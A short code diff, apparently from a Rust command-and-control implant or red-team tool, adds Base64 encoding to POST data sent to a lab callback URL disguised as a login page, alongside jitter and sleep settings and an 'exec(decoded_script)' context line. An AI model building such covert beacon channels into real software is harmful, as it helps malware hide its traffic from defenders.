@@ -270,7 +270,7 @@ exec(decoded_script)
                         url: String::from("http://192.168.56.1:3000/login.php"),
                         //dataoperation: vec![DataOperation::BASE64],
                         dataoperation: vec![DataOperation::BASE64,DataOperation::BASE64],
-                        dataoperation_post: vec![],
+                        dataoperation_post: vec![DataOperation::BASE64],
                         jitt: 0,
                         sleep: 0,
                     }),
